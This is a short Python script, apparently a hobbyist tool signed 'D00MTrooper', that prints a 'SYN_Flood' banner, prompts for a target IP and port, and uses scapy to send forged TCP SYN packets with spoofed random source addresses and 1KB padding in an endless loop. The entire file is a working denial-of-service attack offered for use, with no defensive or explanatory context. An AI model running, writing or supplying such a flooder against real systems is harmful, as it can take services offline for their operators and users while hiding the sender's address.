import keyboard
from scapy.all import *


if __name__ == "__main__":
    while True:
        print(f"  /$$$$$$  /$$     /$$ /$$   /$$        /$$$$$$$$ /$$                           /$$")
        print(f" /$$__  $$|  $$   /$$/| $$$ | $$       | $$_____/| $$                          | $$")
        print(f"| $$  \__/ \  $$ /$$/ | $$$$| $$       | $$      | $$  /$$$$$$   /$$$$$$   /$$$$$$$")
        print(f"|  $$$$$$   \  $$$$/  | $$ $$ $$       | $$$$$   | $$ /$$__  $$ /$$__  $$ /$$__  $$")
        print(f" \____  $$   \  $$/   | $$  $$$$       | $$__/   | $$| $$  \ $$| $$  \ $$| $$  | $$")
        print(f" /$$  \ $$    | $$    | $$\  $$$       | $$      | $$| $$  | $$| $$  | $$| $$  | $$")
        print(f"|  $$$$$$/    | $$    | $$ \  $$       | $$      | $$|  $$$$$$/|  $$$$$$/|  $$$$$$$")
        print(f" \______/     |__/    |__/  \__//$$$$$$|__/      |__/ \______/  \______/  \_______/")
        print(f"                               |______/                                            made by D00MTrooper ")


        #target import ipdb
        target_ip = input("Choose IP: ")
        #port you want to flood
        target_port = int(input("Choose port: "))

        #________________________________________________________________________

        ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)
        # stack up the layers
        p = ip / tcp / raw

        #________________________________________________________________________

        # send the constructed packet in a loop until CTRL+C is detected
        send(p, loop=1, verbose=0)
